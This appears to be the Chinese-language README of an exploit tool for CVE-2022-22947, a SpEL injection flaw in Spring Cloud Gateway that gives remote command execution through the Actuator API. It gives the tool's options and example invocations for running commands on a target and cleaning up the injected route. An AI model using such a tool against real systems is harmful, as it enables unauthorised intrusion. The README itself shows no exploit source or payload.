# cve-2022-22947

`Spring Cloud Gateway` 是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。

**使用：** 

```
➜ ./cve-2022-22947 -h
Usage of cve-2022-22947:
  -c string
    	Execute command, Example: whoami (default "id")
  -d	Delete route.
  -r string
    	New route name
  -u string
    	Target Url, Example: http://127.0.0.1:8080

# example

[>] Usage: ./CVE-2022-22947 -u http://127.0.0.1:8080 -c whoami -r exploit.
[>] Usage: ./CVE-2022-22947 -u http://127.0.0.1:8080 -r exploit -d

```

遇到的问题：https://darkb1rd.github.io/2022/03/07/yuque/cve-2022-22947%20%E5%B0%8F%E7%82%B9/
